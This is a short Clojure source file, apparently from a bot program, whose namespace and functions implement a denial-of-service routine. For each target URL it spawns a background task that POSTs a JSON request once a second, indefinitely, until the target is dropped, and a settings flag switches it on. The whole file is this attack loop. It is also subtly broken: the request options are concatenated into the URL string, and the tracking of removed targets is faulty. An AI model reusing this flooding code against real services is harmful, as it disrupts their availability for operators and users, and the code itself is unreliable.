(ns black-friday.bot.dos
  (:require [black-friday.bot.settings :as s]
            [clj-http.client :as client]
            [common.string :as xstr]
            [clojure.set :as set]))

(def ^:private targets (agent {:active #{} :removed #{}}))

(def attack-request {})

(defn- attack [url]
  (try
    (client/post (str url
                      {:body          attack-request
                       :content-type :json
                       :as           :json}))
    (catch Throwable t))
  (Thread/sleep 1000)
  (when (not (contains? (:removed @targets) url)) (recur url)))

(defn- update-targets-action [targets next-target-urls]
  (let [current-target-urls (:active targets)]
    (doseq [new-target-url (set/difference next-target-urls current-target-urls)]
           (future (attack new-target-url)))
    {:active next-target-urls
     :removed (set/union (set/difference current-target-urls next-target-urls))}))

(defn update-dos-targets [urls]
  (if (s/dos-attact-active?)
    (send targets update-targets-action
           (set (filter (partial xstr/substring? (s/bot-url)) urls)))))
